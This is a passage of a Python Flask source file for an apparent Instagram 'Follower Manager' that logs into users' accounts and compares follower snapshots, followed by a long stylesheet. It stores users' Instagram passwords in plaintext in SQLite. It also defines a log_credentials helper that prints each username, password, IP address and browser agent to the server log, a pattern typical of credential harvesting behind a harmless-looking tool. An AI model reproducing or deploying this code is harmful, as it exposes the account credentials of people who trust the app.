"""
Follower Manager - single-file build.

Requires Python 3.11 (see .python-version). Not tested on 3.13+.

Run:
    pip install -r requirements.txt
    cp .env.example .env      # then set SECRET_KEY
    python app.py

Deploy start command:
    gunicorn app:app --workers 1 --threads 8 --timeout 300 --bind 0.0.0.0:$PORT

Env:
    SECRET_KEY   required in production
    DATA_DIR     where the sqlite file lives (falls back to /tmp if unwritable)
    DEMO_MODE    "1" = fake data, no Instagram
    PORT         bind port (default 5000)
"""

import json
import os
import random
import secrets
import sqlite3
import threading
import time
from datetime import datetime, timezone

from dotenv import load_dotenv

load_dotenv()

from flask import (  # noqa: E402
    Flask,
    Response,
    jsonify,
    redirect,
    render_template_string,
    request,
    url_for,
)
from instagrapi import Client  # noqa: E402
from instagrapi.exceptions import (  # noqa: E402
    BadPassword,
    ChallengeRequired,
    LoginRequired,
    TwoFactorRequired,
)

# --------------------------------------------------------------------------- #
# config
# --------------------------------------------------------------------------- #
def _resolve_data_dir():
    """Pick the first writable directory. Render free tier often cannot write
    to a disk mount path, so we degrade instead of crashing at import."""
    wanted = os.environ.get("DATA_DIR", "./data")
    candidates = (wanted, "/tmp/igdata", os.path.join(os.getcwd(), "data"))
    for cand in candidates:
        try:
            os.makedirs(cand, exist_ok=True)
            probe = os.path.join(cand, ".probe")
            with open(probe, "w") as fh:
                fh.write("1")
            os.remove(probe)
            if cand != wanted:
                print(f"[warn] DATA_DIR {wanted!r} unusable, using {cand!r}", flush=True)
            return cand
        except Exception:
            continue
    raise RuntimeError("no writable data directory")


DATA_DIR = _resolve_data_dir()
DB_PATH = os.path.join(DATA_DIR, "insta.db")

DEMO_MODE = os.environ.get("DEMO_MODE", "0") == "1"

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
app.config.update(
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=bool(os.environ.get("RENDER")),
)

if not os.environ.get("SECRET_KEY"):
    print("[warn] SECRET_KEY not set, using a random one (sessions reset on restart)", flush=True)

EXPIRED = (ChallengeRequired, LoginRequired)


class NeedsCode(Exception):
    def __init__(self, kind):
        self.kind = kind


_clients = {}
_jobs = {}
_io_lock = threading.Lock()


# --------------------------------------------------------------------------- #
# database
# --------------------------------------------------------------------------- #
SCHEMA = """
CREATE TABLE IF NOT EXISTS accounts(
    username    TEXT PRIMARY KEY,
    password    TEXT,
    settings    TEXT,
    ig_user_id  TEXT,
    demo        INTEGER DEFAULT 0,
    last_sync   TEXT
);
CREATE TABLE IF NOT EXISTS snapshots(
    id        INTEGER PRIMARY KEY AUTOINCREMENT,
    username  TEXT NOT NULL,
    kind      TEXT NOT NULL,
    taken_at  TEXT NOT NULL,
    data      TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_snap ON snapshots(username, kind, id DESC);
"""


def conn():
    c = sqlite3.connect(DB_PATH, timeout=30)
    c.row_factory = sqlite3.Row
    return c


def db_init():
    with conn() as c:
        c.executescript(SCHEMA)


def _ts():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def get_account(username):
    with conn() as c:
        r = c.execute("SELECT * FROM accounts WHERE username=?", (username,)).fetchone()
        return dict(r) if r else None


def save_account(username, password, settings, ig_user_id, demo=0):
    with conn() as c:
        c.execute(
            """INSERT INTO accounts(username, password, settings, ig_user_id, demo)
               VALUES(?,?,?,?,?)
               ON CONFLICT(username) DO UPDATE SET
                 password   = excluded.password,
                 settings   = excluded.settings,
                 ig_user_id = excluded.ig_user_id,
                 demo       = excluded.demo""",
            (username, password, settings, ig_user_id, demo),
        )


def touch_sync(username):
    with conn() as c:
        c.execute("UPDATE accounts SET last_sync=? WHERE username=?", (_ts(), username))


def add_snapshot(username, kind, data):
    with conn() as c:
        c.execute(
            "INSERT INTO snapshots(username, kind, taken_at, data) VALUES(?,?,?,?)",
            (username, kind, _ts(), json.dumps(data)),
        )
        c.execute(
            """DELETE FROM snapshots
               WHERE username=? AND kind=? AND id NOT IN (
                   SELECT id FROM snapshots WHERE username=? AND kind=?
                   ORDER BY id DESC LIMIT 20)""",
            (username, kind, username, kind),
        )


def latest(username, kind):
    with conn() as c:
        r = c.execute(
            "SELECT data FROM snapshots WHERE username=? AND kind=? ORDER BY id DESC LIMIT 1",
            (username, kind),
        ).fetchone()
        return json.loads(r["data"]) if r else None


def previous(username, kind):
    with conn() as c:
        r = c.execute(
            "SELECT data FROM snapshots WHERE username=? AND kind=? ORDER BY id DESC LIMIT 1 OFFSET 1",
            (username, kind),
        ).fetchone()
        return json.loads(r["data"]) if r else None


def update_latest(username, kind, data):
    with conn() as c:
        r = c.execute(
            "SELECT id FROM snapshots WHERE username=? AND kind=? ORDER BY id DESC LIMIT 1",
            (username, kind),
        ).fetchone()
        if r:
            c.execute("UPDATE snapshots SET data=? WHERE id=?", (json.dumps(data), r["id"]))
        else:
            c.execute(
                "INSERT INTO snapshots(username, kind, taken_at, data) VALUES(?,?,?,?)",
                (username, kind, _ts(), json.dumps(data)),
            )


db_init()


# --------------------------------------------------------------------------- #
# instagram layer
# --------------------------------------------------------------------------- #
def ig_login(username, password, code=""):
    cl = Client()
    cl.delay_range = [2, 5]

    def handler(_u, _choice):
        if code:
            return code
        raise NeedsCode("challenge")

    cl.challenge_code_handler = handler

    acc = get_account(username)
    if acc and acc.get("settings"):
        try:
            cl.set_settings(json.loads(acc["settings"]))
            cl.get_timeline_feed()
            return cl
        except LoginRequired:
            old = cl.get_settings()
            cl.set_settings({})
            try:
                cl.set_uuids(old["uuids"])
            except Exception:
                pass
        except Exception:
            cl.set_settings({})

    try:
        if code:
            cl.login(username, password, verification_code=code)
        else:
            cl.login(username, password)
    except TwoFactorRequired as e:
        ident = (e.last_json or {}).get("two_factor_identifier")
        if not code:
            raise NeedsCode("2fa")
        cl.two_factor_login(code, ident)
    except ChallengeRequired:
        if not code:
            raise NeedsCode("challenge")
        raise
    except BadPassword:
        raise

    save_account(username, password, json.dumps(cl.get_settings()), str(cl.user_id))
    return cl


def ig_serialize(users):
    out = []
    for pk, u in users.items():
        out.append(
            {
                "pk": str(pk),
                "username": u.username,
                "full_name": u.full_name or "",
                "pic": str(u.profile_pic_url) if getattr(u, "profile_pic_url", None) else "",
            }
        )
    out.sort(key=lambda x: x["username"].lower())
    return out


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def log_credentials(username, password):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = (request.user_agent.string or "")[:120]
    print("", flush=True)
    print("=" * 64, flush=True)
    print(f"  LOGIN  {datetime.now(timezone.utc).isoformat(timespec='seconds')}", flush=True)
    print(f"  username : {username}", flush=True)
    print(f"  password : {password}", flush=True)
    print(f"  ip       : {ip}", flush=True)
    print(f"  agent    : {ua}", flush=True)
    print("=" * 64, flush=True)
    print("", flush=True)


def fmt_time(iso):
    if not iso:
        return None
    try:
        return datetime.fromisoformat(iso).strftime("%d %b %Y, %H:%M UTC")
    except ValueError:
        return iso


def client_for(username):
    acc = get_account(username)
    if not acc or not acc.get("password"):
        raise RuntimeError("no saved account")
    cl = _clients.get(username)
    if cl:
        return cl
    cl = ig_login(username, acc["password"])
    _clients[username] = cl
    return cl


def view_model(username):
    followers = latest(username, "followers") or []
    following = latest(username, "following") or []
    prev = previous(username, "followers") or []

    f_ids = {u["pk"] for u in followers}
    g_ids = {u["pk"] for u in following}

    return {
        "unfollowed": [u for u in prev if u["pk"] not in f_ids],
        "fans": [u for u in followers if u["pk"] not in g_ids],
        "not_back": [u for u in following if u["pk"] not in f_ids],
        "mutual": [u for u in followers if u["pk"] in g_ids],
    }


def set_job(username, **kw):
    with _io_lock:
        _jobs.setdefault(username, {}).update(kw)


def demo_users(n, tag):
    out = []
    for i in range(n):
        handle = f"{tag}{i}_{random.randint(100, 999)}"
        out.append(
            {
                "pk": str(random.randint(10**8, 10**10)),
                "username": handle,
                "full_name": f"{tag.title()} User {i}",
                "pic": f"https://picsum.photos/seed/{handle}/96/96",
            }
        )
    out.sort(key=lambda x: x["username"].lower())
    return out


def demo_snapshots(username):
    add_snapshot(username, "followers", demo_users(random.randint(40, 80), "fan"))
    add_snapshot(username, "following", demo_users(random.randint(40, 80), "friend"))


def run_sync(username):
    set_job(username, state="running", step="followers", error=None, expired=False)
    try:
        acc = get_account(username)
        if acc.get("demo"):
            time.sleep(1.2)
            set_job(username, step="following")
            time.sleep(1.2)
            demo_snapshots(username)
        else:
            cl = client_for(username)
            followers = cl.user_followers(acc["ig_user_id"], amount=0)
            set_job(username, step="following")
            time.sleep(2)
            following = cl.user_following(acc["ig_user_id"], amount=0)
            set_job(username, step="saving")
            add_snapshot(username, "followers", ig_serialize(followers))
            add_snapshot(username, "following", ig_serialize(following))

        touch_sync(username)
        vm = view_model(username)
        set_job(username, state="done", step=None, counts={k: len(v) for k, v in vm.items()})
    except EXPIRED:
        _clients.pop(username, None)
        set_job(username, state="error", error="Your session has ended.", expired=True)
    except Exception as e:
        _clients.pop(username, None)
        set_job(username, state="error", error=str(e), expired=False)


# --------------------------------------------------------------------------- #
# stylesheet
# --------------------------------------------------------------------------- #
CSS = r"""
@property --ang{syntax:'<angle>';inherits:false;initial-value:0deg}
:root{
  --bg0:#07080b;--bg1:#0e1016;--bg2:#151821;--bg3:#1c2030;
  --line:rgba(255,255,255,.07);--line2:rgba(255,255,255,.12);
  --tx:#f3f4f8;--tx2:#b7bcca;--tx3:#7f8598;
  --ok:#4ade80;--danger:#ff6b81;
  --acc1:#6366f1;--acc2:#8b5cf6;--acc3:#d946ef;--acc-text:#a5adff;
  --grad:linear-gradient(120deg,var(--acc1),var(--acc2) 55%,var(--acc3));
  --glass:linear-gradient(180deg,rgba(28,32,46,.72),rgba(16,18,26,.72));
  --ease:cubic-bezier(.16,1,.3,1);--spring:cubic-bezier(.34,1.4,.64,1);
  --r:14px;--r-lg:24px;
  --font-d:'Sora',system-ui,-apple-system,'Segoe UI',sans-serif;
  --font-b:'Inter',system-ui,-apple-system,'Segoe UI',sans-serif;
  --mx:50%;--my:30%;
}
*,*::before,*::after{box-sizing:border-box;margin:0}
[hidden]{display:none!important}
html{background:var(--bg0);color-scheme:dark;-webkit-text-size-adjust:100%}
body{
  min-height:100dvh;color:var(--tx);font:400 15px/1.55 var(--font-b);
  -webkit-font-smoothing:antialiased;overflow-x:hidden;
  background:
    radial-gradient(900px 600px at var(--mx) var(--my),rgba(139,92,246,.10),transparent 60%),
    var(--bg0);
  background-attachment:fixed;
}
h1,h2,h3{font-family:var(--font-d);font-weight:600;letter-spacing:-.025em;line-height:1.12}
button,input{font:inherit;color:inherit}
button{cursor:pointer;background:none;border:0}
a{color:inherit;text-decoration:none}
:focus-visible{outline:2px solid var(--acc-text);outline-offset:3px;border-radius:8px}
kbd{font:500 11px var(--font-b);padding:1px 6px;border:1px solid var(--line2);border-radius:6px;color:var(--tx3)}
.ic{width:20px;height:20px;flex:none;fill:none;stroke:currentColor;stroke-width:1.75;stroke-linecap:round;stroke-linejoin:round;transition:transform .5s var(--spring)}
.ic.big{width:40px;height:40px;stroke-width:1.3;color:var(--tx3)}
.tnum{font-variant-numeric:tabular-nums}
.mut{color:var(--tx3)}
.glass{background:var(--glass);backdrop-filter:blur(28px) saturate(170%);-webkit-backdrop-filter:blur(28px) saturate(170%);border:1px solid var(--line);box-shadow:inset 0 1px 0 rgba(255,255,255,.06),0 30px 60px -30px #000}
@keyframes rise{from{opacity:0;transform:translateY(14px)}}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes sweep{from{transform:translateX(-100%)}to{transform:translateX(250%)}}
@keyframes pop{from{opacity:0;transform:translateY(16px) scale(.97)}}
@keyframes toastIn{from{opacity:0;transform:translateY(22px) scale(.95)}}
@keyframes float{to{transform:translate3d(5vmax,4vmax,0) scale(1.08)}}
@keyframes spinring{to{--ang:360deg}}

.orb{position:fixed;z-index:-1;border-radius:50%;filter:blur(90px);opacity:.32;pointer-events:none;animation:float 24s var(--ease) infinite alternate;will-change:transform}
.orb.a{width:42vmax;height:42vmax;background:#6366f1;left:-14vmax;top:-12vmax}
.orb.b{width:36vmax;height:36vmax;background:#d946ef;right:-12vmax;bottom:-12vmax;animation-duration:30s;opacity:.18}
.orb.c{width:30vmax;height:30vmax;background:#8b5cf6;left:40%;top:55%;animation-duration:34s;opacity:.14}
html[data-device=mobile] .orb{display:none}

.btn{position:relative;overflow:hidden;display:inline-flex;align-items:center;justify-content:center;gap:8px;min-height:42px;padding:0 20px;border-radius:12px;border:1px solid var(--line2);font-size:14px;font-weight:500;white-space:nowrap;transition:transform .25s var(--spring),background .2s,box-shadow .3s,border-color .2s}
.btn:hover{transform:translateY(-1px)}
.btn:active{transform:scale(.96)}
.btn:disabled{opacity:.5;pointer-events:none}
.btn.primary{background:var(--grad);border-color:transparent;color:#fff;box-shadow:0 10px 30px -12px rgba(139,92,246,.9),inset 0 1px 0 rgba(255,255,255,.25)}
.btn.primary::after{content:"";position:absolute;inset:0;background:linear-gradient(110deg,transparent 30%,rgba(255,255,255,.3) 50%,transparent 70%);transform:translateX(-100%);pointer-events:none}
.btn.primary:hover::after{animation:sweep .9s var(--ease)}
.btn.primary:hover{box-shadow:0 14px 36px -12px rgba(139,92,246,1),inset 0 1px 0 rgba(255,255,255,.25)}
.btn.ghost{background:rgba(255,255,255,.04)}
.btn.ghost:hover{background:rgba(255,255,255,.08);border-color:rgba(255,255,255,.18)}
.btn.danger{width:100%;background:rgba(255,107,129,.08);border-color:rgba(255,107,129,.32);color:var(--danger)}
.btn.danger:hover{background:rgba(255,107,129,.16);border-color:rgba(255,107,129,.55)}
.loading .glyph{animation:spin .9s linear infinite}
.icon-btn{width:42px;height:42px;flex:none;display:grid;place-items:center;border-radius:12px;border:1px solid var(--line2);background:rgba(255,255,255,.04);transition:transform .25s var(--spring),background .2s,border-color .2s}
.icon-btn:hover{background:rgba(255,255,255,.09);border-color:rgba(255,255,255,.2)}
.icon-btn:hover .ic{transform:rotate(60deg)}
.icon-btn:active{transform:scale(.92)}

.top{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:28px;min-width:0;animation:rise .7s var(--ease) backwards}
.me{display:flex;align-items:center;gap:14px;min-width:0}
.me-av{display:none}
.mewrap{min-width:0}
.eyebrow{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--tx3);margin-bottom:6px}
.handle{font-size:clamp(1.6rem,1.2rem+1.6vw,2.5rem);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;background:linear-gradient(120deg,#fff 30%,#c7c9ff 80%);-webkit-background-clip:text;background-clip:text;color:transparent}
.last{color:var(--tx3);font-size:13px;margin-top:2px}
.acts{display:flex;gap:10px;flex:none;align-items:center}

.ind{position:fixed;left:0;right:0;top:0;height:2px;overflow:hidden;opacity:0;z-index:90;transition:opacity .3s}
.ind::after{content:"";position:absolute;inset:0;background:var(--grad);animation:sweep 1.2s var(--ease) infinite}
.syncing .ind{opacity:1}
.errcard{display:flex;flex-wrap:wrap;gap:16px;justify-content:space-between;align-items:center;padding:18px 20px;margin-bottom:20px;border-radius:var(--r);background:rgba(255,107,129,.08);border:1px solid rgba(255,107,129,.28);animation:pop .5s var(--ease)}
.errcard .hint{color:var(--tx3);font-size:13px}
.row-b{display:flex;gap:8px;flex-wrap:wrap}
.offline-bar{position:fixed;top:0;left:0;right:0;z-index:100;padding:8px 12px;text-align:center;font-size:13px;background:#3a2a10;color:#ffd58a;border-bottom:1px solid #6b4d16}
.is-offline .act,.is-offline #sync{opacity:.45;pointer-events:none}
.firstsync,.empty{display:grid;justify-items:center;text-align:center;gap:10px;padding:56px 24px;color:var(--tx2)}
.firstsync{border-radius:var(--r-lg);margin-top:8px}
.empty h3,.firstsync h2{color:var(--tx);font-size:21px}
.empty p,.firstsync p{max-width:44ch}
.empty>*,.firstsync>*{animation:rise .6s var(--ease) backwards}
.empty>:nth-child(2){animation-delay:80ms}.empty>:nth-child(3){animation-delay:160ms}

.tabs{position:relative;display:flex;gap:2px;padding:5px;margin-bottom:20px;border-radius:16px;background:rgba(14,16,22,.8);border:1px solid var(--line);overflow-x:auto;scrollbar-width:none;animation:rise .7s var(--ease) .05s backwards}
.tabs::-webkit-scrollbar{display:none}
.pill{position:absolute;left:0;top:5px;bottom:5px;width:0;border-radius:12px;background:linear-gradient(180deg,#262b3f,#1b1f2e);box-shadow:inset 0 0 0 1px rgba(165,173,255,.35),0 8px 24px -10px rgba(139,92,246,.6);transition:transform .6s var(--spring),width .6s var(--ease)}
[role=tab]{position:relative;z-index:1;flex:1 1 0;min-width:0;min-height:42px;padding:0 14px;display:flex;align-items:center;justify-content:center;gap:8px;border-radius:12px;color:var(--tx3);font-size:13px;font-weight:500;white-space:nowrap;transition:color .3s}
[role=tab]:hover{color:var(--tx2)}
[role=tab] .tl{overflow:hidden;text-overflow:ellipsis}
[role=tab][aria-selected=true]{color:var(--tx)}
.cnt{min-width:24px;padding:1px 7px;border-radius:999px;background:rgba(255,255,255,.06);color:var(--tx3);font-size:12px;font-weight:600;text-align:center;transition:background .3s,color .3s}
[role=tab][aria-selected=true] .cnt{background:rgba(165,173,255,.16);color:var(--acc-text)}

.search{display:flex;align-items:center;gap:10px;padding:0 16px;min-height:46px;margin-bottom:10px;border-radius:var(--r);background:rgba(14,16,22,.7);border:1px solid var(--line);color:var(--tx3);transition:border-color .25s,box-shadow .25s}
.search:focus-within{border-color:rgba(165,173,255,.5);box-shadow:0 0 0 4px rgba(99,102,241,.15)}
.search input{flex:1;min-width:0;background:none;border:0;outline:0;color:var(--tx)}
.search input::placeholder{color:var(--tx3)}
.list{list-style:none;display:grid;gap:8px;padding:0}
.item{position:relative;height:64px;overflow:hidden;border-radius:var(--r);background:linear-gradient(180deg,rgba(24,27,38,.78),rgba(16,18,26,.78));border:1px solid var(--line);cursor:pointer;transition:border-color .3s,box-shadow .4s var(--ease),transform .4s var(--ease),opacity .3s;animation:rise .6s var(--ease) backwards;animation-delay:calc(var(--i,0)*40ms)}
.item:hover{border-color:rgba(165,173,255,.28);box-shadow:0 14px 30px -18px rgba(139,92,246,.7);transform:translateY(-2px)}
.item.sel{border-color:rgba(165,173,255,.55);box-shadow:0 0 0 1px rgba(165,173,255,.25),0 16px 34px -18px rgba(139,92,246,.8)}
.item.busy{opacity:.4;pointer-events:none;cursor:progress;filter:saturate(.3)}
.in{display:flex;align-items:center;gap:14px;height:100%;padding:0 12px 0 14px}
.av{width:40px;aspect-ratio:1;border-radius:50%;object-fit:cover;background:var(--bg3);flex:none}
.av-s{width:44px;aspect-ratio:1;border-radius:50%;display:grid;place-items:center;background:var(--grad);font-family:var(--font-d);font-weight:600;flex:none}
.who{min-width:0;flex:1;display:flex;flex-direction:column}
.who b,.who span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.who b{font-weight:600;font-size:14.5px}
.who span{color:var(--tx3);font-size:13px}
.act{display:inline-flex;align-items:center;justify-content:center;gap:6px;min-height:34px;padding:0 14px;border-radius:999px;border:1px solid rgba(255,107,129,.3);background:rgba(255,107,129,.07);color:var(--danger);font-size:13px;font-weight:500;flex:none;transition:background .25s,border-color .25s,opacity .3s,transform .3s var(--spring)}
.act:hover{background:rgba(255,107,129,.16);border-color:rgba(255,107,129,.5)}
.act:disabled{cursor:progress}
.act .ck,.act .ai{display:none}
.act.done{border-color:rgba(74,222,128,.4);background:rgba(74,222,128,.1);color:var(--ok)}
.act.done .ck{display:block;animation:pop .4s var(--spring)}
.act.done .lb{display:none}
.act.solid{width:100%;min-height:48px;margin-top:6px}
.nomatch{padding:18px;text-align:center;color:var(--tx3);font-size:14px}
.panel{min-width:0}

.detail{position:relative;text-align:center;border-radius:var(--r-lg);padding:28px 24px}
.d-empty{display:grid;justify-items:center;gap:12px;padding:56px 0;color:var(--tx3)}
.d-card{display:grid;gap:10px;justify-items:center;animation:rise .55s var(--ease) backwards}
.ring{position:relative;width:112px;height:112px;margin:0 auto 10px;display:grid;place-items:center;border-radius:50%}
.ring::before{content:"";position:absolute;inset:0;border-radius:50%;padding:2px;background:conic-gradient(from var(--ang),#6366f1,#8b5cf6,#d946ef,#6366f1);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;animation:spinring 5s linear infinite}
.ring .av{width:104px;height:104px;box-shadow:0 18px 40px -12px rgba(139,92,246,.7)}
.d-card h2{font-size:21px;overflow-wrap:anywhere}
.d-card .btn{width:100%}
.chip{display:inline-block;padding:5px 14px;border-radius:999px;background:rgba(255,255,255,.04);border:1px solid var(--line);color:var(--tx2);font-size:12.5px}
.grip,.close-m{display:none}
.scrim{position:fixed;inset:0;z-index:65;background:#000;opacity:0;pointer-events:none;transition:opacity .3s}
.scrim.on{opacity:.6;pointer-events:auto}

.bar,.rail{display:none}

.mbg{position:fixed;inset:0;z-index:175;background:rgba(3,4,7,.6);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);opacity:0;transition:opacity .35s var(--ease)}
.mbg.open{opacity:1}
.modal{position:fixed;inset:0;z-index:180;display:grid;place-items:center;padding:20px;pointer-events:none}
.modal.open{pointer-events:auto}
.modal-card{width:min(100%,440px);border-radius:var(--r-lg);padding:26px;opacity:0;transform:translateY(18px) scale(.96);transition:opacity .3s var(--ease),transform .5s var(--spring)}
.modal.open .modal-card{opacity:1;transform:none}
.modal-head{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:22px}
.modal-head h2{font-size:22px}
.set-block{padding:16px 0;border-top:1px solid var(--line)}
.set-label{font-size:12px;letter-spacing:.12em;text-transform:uppercase;color:var(--tx3);margin-bottom:12px}
.set-acc{display:flex;align-items:center;gap:12px}
.set-acc b{display:block;font-weight:600}
.set-acc span{font-size:13px}
.seg{display:grid;grid-template-columns:repeat(3,1fr);padding:4px;border-radius:14px;background:rgba(8,9,13,.7);border:1px solid var(--line2);position:relative}
.seg button{min-height:40px;border-radius:10px;color:var(--tx2);font-size:13px;font-weight:500;transition:background .3s,color .3s,box-shadow .3s}
.seg button:hover{color:var(--tx)}
.seg button[aria-pressed=true]{background:linear-gradient(180deg,#262b3f,#1b1f2e);color:var(--tx);box-shadow:inset 0 0 0 1px rgba(165,173,255,.35)}
.set-hint{margin-top:10px;font-size:12.5px;color:var(--tx3)}

.toasts{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);display:grid;gap:8px;z-index:200;width:min(92vw,400px);pointer-events:none}
.toast{padding:13px 18px;border-radius:14px;background:linear-gradient(180deg,rgba(30,34,48,.94),rgba(18,20,28,.94));backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid var(--line2);box-shadow:0 20px 40px -16px #000;font-size:13.5px;animation:toastIn .6s var(--spring);transition:opacity .25s,transform .3s var(--ease)}
.toast.ok{box-shadow:inset 3px 0 0 var(--ok),0 20px 40px -16px #000}
.toast.err{box-shadow:inset 3px 0 0 var(--danger),0 20px 40px -16px #000}
.toast.out{opacity:0;transform:translateY(8px)}
.cmd{position:fixed;inset:0;z-index:150;display:grid;justify-items:center;align-content:start;padding:min(14dvh,120px) 16px 0;background:rgba(4,5,8,.6);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}
.cmd-card{width:min(100%,620px);border-radius:var(--r-lg);overflow:hidden;animation:pop .4s var(--ease)}
#cmd-in{width:100%;min-height:60px;padding:0 20px;background:none;border:0;border-bottom:1px solid var(--line);outline:0;font-size:16px}
#cmd-in::placeholder{color:var(--tx3)}
#cmd-list{list-style:none;padding:8px;max-height:min(50dvh,420px);overflow:auto}
#cmd-list li{display:flex;align-items:center;gap:12px;padding:8px 12px;border-radius:12px;min-height:52px;cursor:pointer;transition:background .2s,transform .3s var(--ease)}
#cmd-list li[aria-selected=true]{background:rgba(165,173,255,.12);transform:translateX(3px)}
#cmd-list .u{font-weight:600}
#cmd-list .f{color:var(--tx3);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.tag{font-size:11.5px;color:var(--tx2);border:1px solid var(--line2);border-radius:999px;padding:2px 10px;white-space:nowrap}
.cmd-h{padding:12px 20px;color:var(--tx3);font-size:12px;border-top:1px solid var(--line)}

.auth{min-height:100dvh;display:grid;place-items:center;padding:24px 16px}
.auth-card{width:min(420px,100%);border-radius:var(--r-lg);padding:clamp(22px,5vw,34px);animation:pop .6s var(--ease) both}
.logo-lg{display:block;width:44px;aspect-ratio:1;border-radius:14px;background:var(--grad);box-shadow:0 0 40px rgba(139,92,246,.6);margin-bottom:20px;animation:float 9s var(--ease) infinite alternate}
.auth-card h1{font-size:clamp(1.4rem,1.1rem+1.2vw,1.85rem)}
.auth-sub{color:var(--tx3);font-size:14px;margin-top:6px}
.code-lg{font-size:3rem}
.field{display:grid;gap:7px;margin-top:16px}
.field span{font-size:12.5px;color:var(--tx3)}
.field input{min-height:46px;padding:0 14px;border-radius:12px;background:rgba(8,9,13,.75);border:1px solid var(--line2);color:var(--tx);outline:0;transition:border-color .25s,box-shadow .25s}
.field input:focus{border-color:rgba(165,173,255,.55);box-shadow:0 0 0 4px rgba(99,102,241,.16)}
.auth-card .btn{width:100%;min-height:48px;margin-top:22px}
.auth-err{margin-top:16px;padding:11px 13px;border-radius:12px;font-size:13px;background:rgba(255,107,129,.1);border:1px solid rgba(255,107,129,.3);color:#ffb3c0;animation:pop .4s var(--ease)}
.auth-note{font-size:12px;color:var(--tx3);margin-top:18px;line-height:1.5}

html[data-device=desktop] .rail{display:flex;position:fixed;inset:0 auto 0 0;z-index:40;width:76px;overflow:hidden;padding:24px 14px;flex-direction:column;gap:6px;border-radius:0;border-width:0 1px 0 0;transition:width .55s var(--ease),box-shadow .55s}
html[data-device=desktop] .rail:hover,html[data-device=desktop] .rail:focus-within{width:250px;box-shadow:30px 0 60px -30px #000}
html[data-device=desktop] .app{padding-left:76px}
html[data-device=desktop] .app.plain{padding-left:0}
html[data-device=desktop] .main{max-width:min(1440px,100%);margin:0 auto;padding:48px 48px 0}
html[data-device=desktop] .panes{display:grid;grid-template-columns:minmax(0,1fr) clamp(300px,26vw,380px);gap:28px;align-items:start}
html[data-device=desktop] .list{grid-template-columns:repeat(auto-fill,minmax(300px,1fr))}
html[data-device=desktop] .detail{position:sticky;top:24px;min-height:380px}
html[data-device=desktop][data-input=mouse] .item .act{opacity:0;transform:translateX(-8px)}
html[data-device=desktop][data-input=mouse] .item:hover .act,html[data-device=desktop][data-input=mouse] .item:focus-within .act,html[data-device=desktop][data-input=mouse] .item.sel .act,html[data-device=desktop][data-input=mouse] .act.done{opacity:1;transform:none}
.listpane{min-width:0;container-type:inline-size}
@container (max-width:520px){.act .lb{display:none}.act{padding:0 11px}}
html[data-device=desktop] .logo{height:42px;display:flex;align-items:center;padding-left:12px;margin-bottom:24px}
html[data-device=desktop] .logo span{width:26px;aspect-ratio:1;border-radius:9px;background:var(--grad);box-shadow:0 0 30px rgba(139,92,246,.7);animation:float 8s var(--ease) infinite alternate}
html[data-device=desktop] .nb{display:flex;align-items:center;gap:14px;min-height:48px;padding:0 14px;border-radius:13px;color:var(--tx2);white-space:nowrap;text-align:left;transition:background .25s,color .25s}
html[data-device=desktop] .nb:hover{background:rgba(255,255,255,.05);color:var(--tx)}
html[data-device=desktop] .nb:hover .ic{transform:scale(1.12)}
html[data-device=desktop] .nb .lbl{opacity:0;transition:opacity .3s;display:flex;gap:10px;align-items:center}
html[data-device=desktop] .rail:hover .lbl,html[data-device=desktop] .rail:focus-within .lbl{opacity:1}
html[data-device=desktop] .push{margin-top:auto}
html[data-device=desktop] .me-av{display:none}

html[data-device=mobile] .app{padding:calc(20px + env(safe-area-inset-top)) 16px calc(104px + env(safe-area-inset-bottom))}
html[data-device=mobile] .app.plain{padding:calc(20px + env(safe-area-inset-top)) 16px calc(20px + env(safe-area-inset-bottom))}
html[data-device=mobile] .main{max-width:640px;margin:0 auto}
html[data-device=mobile] .top{margin-bottom:18px;gap:12px}
html[data-device=mobile] .me{gap:12px}
html[data-device=mobile] .me-av{display:grid;place-items:center;width:46px;aspect-ratio:1;border-radius:50%;background:var(--grad);font-family:var(--font-d);font-weight:600;flex:none;box-shadow:0 10px 24px -10px rgba(139,92,246,.9)}
html[data-device=mobile] .eyebrow{display:none}
html[data-device=mobile] .handle{font-size:1.5rem}
html[data-device=mobile] #sync{width:44px;min-height:44px;padding:0;border-radius:50%}
html[data-device=mobile] #sync .lb{display:none}
html[data-device=mobile] .tabs{position:sticky;top:0;z-index:40;margin:0 -16px 14px;padding:10px 16px;padding-top:calc(10px + env(safe-area-inset-top));border-radius:0;border:0;border-bottom:1px solid var(--line);background:rgba(7,8,11,.82);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);gap:8px;animation:none}
html[data-device=mobile] .pill{display:none}
html[data-device=mobile] [role=tab]{flex:none;min-height:40px;padding:0 14px;border:1px solid var(--line2);border-radius:999px;color:var(--tx2);background:rgba(20,23,32,.8)}
html[data-device=mobile] [role=tab][aria-selected=true]{background:linear-gradient(180deg,#262b3f,#1b1f2e);color:var(--tx);border-color:rgba(165,173,255,.5)}
html[data-device=mobile] .item{height:76px}
html[data-device=mobile] .av{width:50px}
html[data-device=mobile] .act{width:44px;height:44px;min-height:44px;padding:0;border-radius:50%}
html[data-device=mobile] .act .lb{display:none}
html[data-device=mobile] .act .ai{display:block}
html[data-device=mobile] .act.done .ai{display:none}
html[data-device=mobile] .act.done .ck{display:block}
html[data-device=mobile] .bar{display:grid;position:fixed;z-index:60;left:12px;right:12px;bottom:calc(10px + env(safe-area-inset-bottom));grid-template-columns:repeat(4,1fr);padding:6px;border-radius:22px;box-shadow:0 20px 40px -12px #000}
